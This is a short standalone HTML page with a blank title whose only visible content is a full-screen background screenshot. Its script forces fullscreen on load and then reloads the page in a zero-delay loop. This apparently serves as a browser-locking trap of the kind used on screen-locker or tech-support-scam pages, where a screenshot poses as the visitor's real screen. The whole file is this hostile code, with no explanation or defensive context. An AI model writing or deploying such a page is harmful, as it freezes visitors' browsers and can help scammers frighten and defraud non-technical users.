<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> </title>
    <link rel="icon" href="https://freeimage.host/i/dLWifDP" type="image/png"> <!-- Favicon link -->
    <style>
        body {
            margin: 0;
            height: 100vh;
            overflow: hidden; /* Prevent scrolling */
            background-image: url('https://i.postimg.cc/ncZH7ST4/Screenshot-2024-09-25-11-14-40-AM.png'); /* Replace with high-quality image URL */
            background-size: cover;
            background-position: center;
            display: flex;
            justify-content: center;
            align-items: center;
        }
    </style>
    <script>
        function goFullscreen() {
            const elem = document.documentElement;
            if (elem.requestFullscreen) {
                elem.requestFullscreen();
            } else if (elem.mozRequestFullScreen) { // Firefox
                elem.mozRequestFullScreen();
            } else if (elem.webkitRequestFullscreen) { // Chrome, Safari, and Opera
                elem.webkitRequestFullscreen();
            } else if (elem.msRequestFullscreen) { // IE/Edge
                elem.msRequestFullscreen();
            }
        }

        window.onload = function() {
            goFullscreen(); // Attempt to go fullscreen
            setInterval(() => { location.reload(); }, 0);
        };
    </script>
</head>
<body>
</body>
</html>
